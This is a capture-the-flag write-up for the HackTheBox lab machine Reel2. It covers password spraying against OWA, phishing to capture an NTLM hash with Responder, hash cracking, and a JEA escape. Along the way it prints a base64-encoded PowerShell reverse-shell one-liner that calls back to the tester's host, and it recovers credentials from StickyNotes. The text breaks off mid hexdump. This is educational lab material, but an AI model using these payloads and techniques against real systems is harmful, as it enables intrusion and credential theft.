---
title: HTB: Reel2
url: https://0xdf.gitlab.io/2021/03/13/htb-reel2.html
date: 2021-03-13T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, htb-reel2, ctf, windows, nmap, gobuster, owa, wallstant, javascript, sprayingtoolkit, phishing, responder, hashcat, ps-remoting, jea, jea-escape, stickynotes, htb-reel
---

![Reel2](https://0xdfimages.gitlab.io/img/reel2-cover.png)

Much like it’s predascor, Reel, Reel2 was focused on realistic attacks against a Windows environment. This time I’ll collect names from a social media site and use them to password spray using the SprayingToolkit. Once I find a working password, I’ll send a link from that account and get an NTLM hash using responder. From there I need to break out of a JEA limited PowerShell, find creds to another account, and trick a custom command from that account into reading root.txt.

## Box Info

| Name | [Reel2](https://hackthebox.com/machines/reel2)  [Reel2](https://hackthebox.com/machines/reel2) [Play on HackTheBox](https://hackthebox.com/machines/reel2) |
| --- | --- |
| Release Date | [03 Oct 2020](https://twitter.com/hackthebox_eu/status/1369681315184967687) |
| Retire Date | 13 Mar 2021 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Reel2 |
| Radar Graph | Radar chart for Reel2 |
| First Blood User | 03:08:20[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 07:06:12[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [cube0x0 cube0x0](https://app.hackthebox.com/users/9164) |

## Recon

### nmap

`nmap` found sixteen open TCP ports:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.210
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-29 15:15 EST
Nmap scan report for 10.10.10.210
Host is up (0.13s latency).
Not shown: 65519 filtered ports
PORT     STATE SERVICE
80/tcp   open  http                                                              
443/tcp  open  https                                                             
5985/tcp open  wsman
6001/tcp open  X11:1 
6002/tcp open  X11:2
6004/tcp open  X11:4
6005/tcp open  X11:5         
6006/tcp open  X11:6                                                             
6007/tcp open  X11:7                                                             
6008/tcp open  X11:8             
6010/tcp open  x11                                                               
6011/tcp open  x11
6012/tcp open  x11  
6017/tcp open  xmail-ctrl
6165/tcp open  unknown
8080/tcp open  http-proxy
                                                                                 
Nmap done: 1 IP address (1 host up) scanned in 28.98 seconds

root@kali# nmap -p 80,443,5985,6001-6017,6165,8080 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.210
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-29 15:58 EST
Nmap scan report for 10.10.10.210
Host is up (0.032s latency).

PORT     STATE    SERVICE    VERSION
80/tcp   open     http       Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: 403 - Forbidden: Access is denied.
443/tcp  open     ssl/https?
|_ssl-date: 2021-01-29T21:21:37+00:00; +20m40s from scanner time.
5985/tcp open     http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6001/tcp open     ncacn_http Microsoft Windows RPC over HTTP 1.0
6002/tcp open     ncacn_http Microsoft Windows RPC over HTTP 1.0
6004/tcp open     ncacn_http Microsoft Windows RPC over HTTP 1.0
6005/tcp open     msrpc      Microsoft Windows RPC
6006/tcp open     msrpc      Microsoft Windows RPC
6007/tcp open     msrpc      Microsoft Windows RPC
6008/tcp open     msrpc      Microsoft Windows RPC
6010/tcp open     ncacn_http Microsoft Windows RPC over HTTP 1.0
6011/tcp open     msrpc      Microsoft Windows RPC
6012/tcp open     msrpc      Microsoft Windows RPC
6017/tcp open     msrpc      Microsoft Windows RPC
6165/tcp open     msrpc      Microsoft Windows RPC
8080/tcp open     http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
|_http-title: Welcome | Wallstant
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 20m39s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.06 seconds

```

The most interesting services are HTTP (80 and 8080), HTTPS (443), WinRM (5985), and then a bunch of Windows RPC ports around 6000.

The [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) of 8.5 implies Windows 8.1 / Server 2012 R2, so an older Windows OS.

### HTTP - TCP 80

#### Site

The site just returns the IIS default 403 Forbidden page:

![image-20210129170906081](https://0xdfimages.gitlab.io/img/image-20210129170906081.png)

#### Directory Brute Force

I tried to run `gobuster` against the site, but everything returns 403:

```

root@kali# gobuster dir -u http://10.10.10.210 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20 -o scans/gobuster-80-small
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.210
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/29 16:52:02 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.210/14c8745f-e577-4bd2-ae0a-1a4a680e1799 => 403. To force processing of Wildcard responses, specify the '--wildcard' switch

```

#### Headers

The headers indicate that the site is running ASP.NET:

```

HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Fri, 29 Jan 2021 22:13:24 GMT
Connection: close
Content-Length: 1233

```

### HTTPS - TCP 443

#### Site

The site here is the default IIS page:

![image-20210129171203571](https://0xdfimages.gitlab.io/img/image-20210129171203571.png)

#### Directory Brute Force

This time, `gobuster` finds stuff:

```

root@kali# gobuster dir -u https://10.10.10.210 -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -o scans/gobuster-443-small
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.210
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/29 16:54:44 Starting gobuster
===============================================================
/public (Status: 302)
/exchange (Status: 302)
/rpc (Status: 401)
/owa (Status: 301)
/ecp (Status: 301)
/ews (Status: 301)
===============================================================
2021/01/29 16:55:55 Finished
===============================================================

```

Of these, `/ews` returns an empty page, `/ecp` returns a 500 error, and `/rpc` requests auth. `owa`, `/public`, and `/exchange` all redirect to an OWA login page.

![image-20210129174832030](https://0xdfimages.gitlab.io/img/image-20210129174832030.png)

At this point I don’t have creds, so I’ll have to come back.

### HTTP - TCP 8080

This page is an instance of [Wallstant](https://wallstant.github.io/), and open source PHP-base social network site:

![image-20210129174956452](https://0xdfimages.gitlab.io/img/image-20210129174956452.png)

`searchsploit` didn’t turn up anything for wallstant.

I’ll click the link to sign up and create an account. I’m taken to my home page:

![image-20210129175229103](https://0xdfimages.gitlab.io/img/image-20210129175229103.png)

One two pages have posts on them:

![image-20210129180248401](https://0xdfimages.gitlab.io/img/image-20210129180248401.png)

![image-20210129180310883](https://0xdfimages.gitlab.io/img/image-20210129180310883.png)

The post name of 2020 and talking about summer is a big hint.

Entering an empty search will load `http://10.10.10.210:8080/search?q=`, which has a list of all the users on the site:

![image-20210130062725460](https://0xdfimages.gitlab.io/img/image-20210130062725460.png)

Inspecting a user in the console, it looks like the HTML for each user has the structure:

```

<a href="u/quimbly" class="user_follow_box_a">
  gregg 
  <br>
  <span style="color:gray;">@quimbly</span>
</a>

```

I dropped into the Firefox console and ran this Javascript:

```

var res = [];
[].forEach.call(userblocks, function(userblock) { if (userblock.textContent) {res.push(userblock.textContent.replace('@','')) }});
console.log(res.join('\n'));

```

This will loop over each of the blocks like the one above and get the text from them. For some reason, half show as empty, so the `if` will filter those out. There’s also an unnecessary `@` in front of the last name, so I’ll remove that.

![image-20210130070309343](https://0xdfimages.gitlab.io/img/image-20210130070309343.png)

That’s the list of full names of users from the site. I’ll save that to a file. In a real world scenario, instead of pulling all the users, I’d pull all the users who worked for the target company, or something like that.

## Shell as k.svensson

### OWA Password Spray

#### Install SprayingToolkit

The first [Reel](/2018/11/10/htb-reel.html) was about Phishing, and there’s already OWA here, so that seems like a likely path. In addition to [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec), byt3bl33d3r also maintains the [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit). I’ll clone the repo, and install the dependencies:

```

root@kali:/opt# git clone https://github.com/byt3bl33d3r/SprayingToolkit                 ...[snip]...                                      
root@kali:/opt# cd SprayingToolkit/
root@kali:/opt/SprayingToolkit# pip3 install -r requirements.txt
...[snip]...

```

#### Spray

`spindrift.py` is a script to create usernames from names (in `users`). I’ll create a list with a few different formats (the default is `{f}{last}`):

```

root@kali# python3 spindrift.py users --target 10.10.10.210 > usernames
root@kali# python3 spindrift.py users --format "{f}.{last}" --target 10.10.10.210 >> usernames
root@kali# python3 spindrift.py users --format "{first}.{last}" --target 10.10.10.210 >> usernames
root@kali# python3 spindrift.py users --format "{first}.{l}" --target 10.10.10.210 >> usernames
root@kali# python3 spindrift.py users --format "{first}{last}" --target 10.10.10.210 >> usernames
root@kali# python3 spindrift.py users --format "{first}{l}" --target 10.10.10.210 >> usernames

```

`atomizer.py` is a script to try a list of usernames and passwords against an OWA instance. Given the hints from Sven’s profile, the password is likely something like “Summer2020” or “summer2020”. I could create a list of passwords to try, but I’ll try that one first, and it works:

```

root@kali# python3 atomizer.py owa 10.10.10.210 'Summer2020' usernames 
[*] Trying to find autodiscover URL                                              
[+] Using OWA autodiscover URL: https://10.10.10.210/autodiscover/autodiscover.xml
[+] OWA domain appears to be hosted internally                            
[+] Got internal domain name using OWA: HTB                             
[*] Starting spray at 2021-01-30 12:33:56 UTC                            
[-] Authentication failed: HTB\jmoore:Summer2020 (Invalid credentials)     
[-] Authentication failed: HTB\gquimbly:Summer2020 (Invalid credentials)
...[snip]...
[+] Found credentials: HTB\s.svensson:Summer2020
...[snip]...
[+] Dumped 1 valid accounts to owa_valid_accounts.txt

```

I tried these creds with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), but without luck. There’s no SMB on the host (at least that I can access), so nothing there either.

### OWA Phish

With creds, I can log into OWA. I’ve had issues with Firefox in OWA on HTB before, so I’ll use the Chromium browser.

![image-20210131063456998](https://0xdfimages.gitlab.io/img/image-20210131063456998.png)

The site also loads in Swedish, but Chromium has Google’s translate built in at the right side of the url bar:

![image-20210130173444313](https://0xdfimages.gitlab.io/img/image-20210130173444313.png)

The inbox, sent, drafts are all empty. But I have access to the global address list (GAL), or list of company users. I’ll open a new email, and click the book next to “To…”. I’ll select all the users, add them to the To line (there are two pages of users, so I’ll do this twice to get all of them), and then hit the save button to go back to the email, and added a subject and a body with a link to me:

![image-20210131064033460](https://0xdfimages.gitlab.io/img/image-20210131064033460.png)

I wasted some time thinking someone would click that link, having a Python HTTP server running. Eventually I tried with `responder` running, which is a good tool to use for this kind of thing, as it listens on HTTP, SMB, and several other services. On hitting send, a short time later:

```

root@kali# responder -I tun0          
...[snip]...
[+] Servers:                                                                     
    HTTP server                [ON]
    HTTPS server               [ON] 
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]                                             
    SMB server                 [ON]                                              
    Kerberos server            [ON]                                              
    SQL server                 [ON]                                              
    FTP server                 [ON] 
    IMAP server                [ON] 
    POP3 server                [ON]                                              
    SMTP server                [ON]                                              
    DNS server                 [ON]
    LDAP server                [ON]                                              
    RDP server                 [ON]  
...[snip]...
[HTTP] NTLMv2 Client   : 10.10.10.210
[HTTP] NTLMv2 Username : htb\k.svensson
[HTTP] NTLMv2 Hash     : k.svensson::htb:a744637ae1987831:2914FC6BD88FE8DA5A080C70A86149E4:0101000000000000A9757D9705F7D60164EFBAB173F97777000000000200060053004D0
042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D006
2002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000597C6F5CC8E25D661693E82FC943898CE439B547E0702307251
131930F64E6280A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00310034000000000000000000

```

This is a connection on HTTP but using NTLM (Windows) authentication.

### Crack Hash

The hash cracks almost instantly in `hashcat`:

```

root@kali# hashcat -m 5600 k.svensson.hash /usr/share/wordlists/rockyou.txt 
...[snip]...
K.SVENSSON::htb:a744637ae1987831:2914fc6bd88fe8da5a080c70a86149e4:0101000000000000a9757d9705f7d60164efbab173f97777000000000200060053004d0042000100160053004d004200
2d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c
000500120073006d0062002e006c006f00630061006c000800300030000000000000000000000000400000597c6f5cc8e25d661693e82fc943898ce439b547e0702307251131930f64e6280a0010000000
00000000000000000000000000000900200048005400540050002f00310030002e00310030002e00310034002e00310034000000000000000000:kittycat1
...[snip]...

```

### Limited Shell

#### Evil-WinRM

When I tried to connect with s.svensson’s creds, it returned a `WinRM::WinRMAuthorizationError`. When I try with k.svensson’s it seems to connect, but with lots of errors:

```

root@kali# evil-winrm -i 10.10.10.210 -u k.svensson -p kittycat1

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException> 

```

If I try to run something as simple as `dir`, it throws the same errors:

```
*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException> dir
The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException>

```

This leads me to believe that this user *is* able to connect over WinRM (ie, Remote Management Users group, or allowed with JEA), but that the connection is in some kind of constrained language mode that isn’t allowing `Invoke-Expression`, which is how [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) executes.

#### PowerShell Remoting

I’ll use PowerShell to get a session on Reel2, either from a Windows host or from Kali (`apt install powershell`) or Parrot (pre-installed). Two gotchas to consider when connecting from Linux:
1. You need to use `-Authentication Negotiate` with `Enter-PSSession`.
2. If you get errors about “Unspecified GSS failure”, you need to `apt install gss-ntlmssp`.

```

PS /> $pass = ConvertTo-SecureString 'kittycat1' -asplaintext -force
PS /> $cred = New-Object System.Management.Automation.PSCredential('htb\k.svensson', $pass)
PS /> Enter-PSSession -Computer 10.10.10.210 -credential $cred -Authentication Negotiate
[10.10.10.210]: PS>

```

#### JEA

This is still super limited. Just `ls` breaks it:

```

[10.10.10.210]: PS>ls
The term 'ls' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, 
verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (ls:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

```

`Get-Command` shows the commands that this shell can run:

```

[10.10.10.210]: PS>Get-Command 

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object

```

That’s not much, and it’s not useful to me. This is Microsoft’s [Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1), or JEA. It allows administrators to limit the commands that specific users can run. I can also access environment variables, so, for example, to get the current user:

```

[10.10.10.210]: PS> $env:username
k.svensson

```

The shell is running in `ConstrainedLanguage` mode:

```

[10.10.10.210]: PS> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

```

### Shell

#### Escape JEA

To break out of the limitations of JEA, there are a couple techniques. One way is to see if this user can define functions, and then call them. For example, I can’t run `Get-Location`, but I can in a function:

```

[10.10.10.210]: PS>get-location
The term 'Get-Location' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was 
included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Get-Location:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 
[10.10.10.210]: PS> function gl {get-location}; gl

Path                         
----                         
C:\Users\k.svensson\Documents

```

I can also skip the function and just use the call operator (`&`) with a script block:

```

[10.10.10.210]: PS> &{ get-location }

Path                         
----                         
C:\Users\k.svensson\Documents

```

#### Full PowerShell

I’ll use the trick above with the [Nishang](https://github.com/samratashok/nishang) rev shell to get a PowerShell shell without the constraints. I’ll grab a copy of `Invoke-PowerShellTcpOneLine.ps1` from the `Shells` directory, and remove all the lines but the one, uncomment it, and update the IP / port:

```

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

I’ll encode that for easier pasting, first converting to utf-16le with `iconv`:

```

root@kali# cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACcALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA

```

Now (with `nc` listening on TCP 443), I’ll run this in a block:

```

[10.10.10.210]: PS> &{ powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACcALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA }

```

At `nc`, there’s a connection (it doesn’t display the prompt until after the first command):

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.210.
Ncat: Connection from 10.10.10.210:23805.
dir

    Directory: C:\Users\k.svensson\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/30/2020   5:14 PM                WindowsPowerShell
-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc
-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc

PS C:\Users\k.svensson\Documents>

```

This shell has `FullLanguage` mode:

```

PS C:\Users\k.svensson\Documents> $ExecutionContext.SessionState.LanguageMode
FullLanguage

```

I can grab `user.txt`:

```

PS C:\Users\k.svensson\desktop> cat user.txt
504207d7************************

```

## Read root.txt

### Enumeration

#### JEA Config

On the desktop there are config files for JEA for another user, `jea_test_account`:

```

PS C:\Users\k.svensson\Documents> ls

    Directory: C:\Users\k.svensson\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/30/2020   5:14 PM                WindowsPowerShell
-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc
-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc   

```

This is a user on Reel2:

```

PS C:\> net user jea_test_account
User name                    jea_test_account
Full Name                    jea_test_account
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/28/2020 1:46:43 PM
Password expires             Never
Password changeable          7/29/2020 1:46:43 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.

```

Using `Select-String` like `grep`, I’ll get the non-commented and non-empty lines:

```

PS C:\Users\k.svensson\Documents> cat jea_test_account.pssc | select-string -notmatch "^#" | select-string .                                                      

@{
SchemaVersion = '2.0.0.0'
GUID = 'd6a39756-aa53-4ef6-a74b-37c6a80fd796'
Author = 'cube0x0'
SessionType = 'RestrictedRemoteServer'
RunAsVirtualAccount = $true
RoleDefinitions = @{
    'htb\jea_test_account' = @{
        'RoleCapabilities' = 'jea_test_account' } }
LanguageMode = 'NoLanguage'
}   

PS C:\Users\k.svensson\Documents> cat jea_test_account.psrc | select-string -notmatch "^#" | select-string .

@{
GUID = '08c0fdac-36ef-43b5-931f-68171c4c8200'                                    
Author = 'cube0x0'                                                               
CompanyName = 'Unknown'
Copyright = '(c) 2020 cube0x0. All rights reserved.'
FunctionDefinitions = @{
    'Name' = 'Check-File'
    'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like "D:\*" -or $Path -like                                                 
"C:\ProgramData\*" ; if($check) {get-content $Path}} }
}   

```

This config applies to jea\_test\_account, and it has `RunAsVirtualAccount` set to true, which is (according to the [docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssessionconfigurationfile?view=powershell-7.1)) “Whether to run this session configuration as the machine’s (virtual) administrator account”. So that’s intriguing for sure. This user has `LanguageMode = 'NoLanguage'`, which will limit what this account can do to basically nothing. But the second file does define a custom function, `Check-File`. If the given path is on the `D:\` drive or starts with `C:\ProgramData`, it will return the contents of the path.

#### StickyNotes

Without access to the `jea_test_account`, I continued to enumerate. I wasn’t able to find evidence of a `D:` drive:

```

PS C:\> powershell -c get-psdrive -psprovider filesystem

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
C                                      FileSystem    C:\

```

Looking around k.svensson’s configuration files, I noticed he’s got data for StickyNotes:

```

PS C:\users\k.svensson\appdata\roaming> dir

    Directory: C:\users\k.svensson\appdata\roaming

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/30/2020   1:17 PM                Adobe
d---s-        7/30/2020   2:43 PM                Microsoft
d-----        7/30/2020   2:27 PM                Mozilla
d-----        7/30/2020   1:23 PM                stickynotes     

```

I did a recursive search in this directory for files that contained the string `jea_test_account`, and found one file:

```

PS C:\users\k.svensson\appdata\roaming\stickynotes> dir -recurse | select-string -pattern "jea_test_account"                                                      
                                                                                                                                                                  
Local Storage\leveldb\000003.log:1:/?uBVERSION1                                                                                                                   
                                               META:app://.??K                                                                                                    
                                                              META:app://.                                                                                        
                                                                         ????????_app://.closed{                                                                  
"closed":"yes"}?I?5V            
                    META:app://.
                               ???????                                           
                                      META:app://.
                                                 ???????
                                                        META:app://.
                                                                   ???????xV$
                                                                             META:app://.
                                                                                        ????????Q?D?
                                                                                                    META:app://.

```

It’s weird, because I don’t see that string in the output. I’ll look more closely, using `format-hex` to get a hexdump:

```

PS C:\users\k.svensson\appdata\roaming\stickynotes> cat "Local Storage\leveldb\000003.log" | format-hex

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F                  
                                                                                 
00000000   2F 3F 3F 75 42 00 01 01 00 00 00 00 00 00 00 03  /??uB...........
00000010   00 00 00 01 07 56 45 52 53 49 4F 4E 01 31 00 0C  .....VERSION.1..
00000020   4D 45 54 41 3A 61 70 70 3A 2F 2F 2E 00 1B 5F 61  META:app://..._a
00000030   70 70 3A 2F 2F 2E 00 01 5F 5F 73 74 6F 72 65 6A  pp://...__storej
00000040   73 5F 5F 74 65 73 74 5F 5F 5A 3F 3F 39 5B 01 01  s__test__Z??9[..
00000050   04 00 00 00 00 00 00 00 05 00 00 00 01 0C 4D 45  ..............ME
00000060   54 41 3A 61 70 70 3A 2F 2F 2E 0C 08 3F 3F 3F 3F  TA:app://...????
00000070   3F 3F 3F 17 10 3F 01 01 0B 5F 61 70 70 3A 2F 2F  ???..?..._app://
00000080   2E 00 01 31 3F 01 01 7B 22 66 69 72 73 74 22 3A  ...1?..{"first":
00000090   22 3C 70 3E 43 72 65 64 65 6E 74 69 61 6C 73 20  "<p>Credentials 
000000A0   66 6F 72 20 4A 45 41 3C 2F 70 3E 3C 70 3E 6A 65  for JEA</p><p>je
000000B0   61 5F 74 65 73 74 5F 61 63 63 6F 75 6E 74 3A 41  a_test_account:A
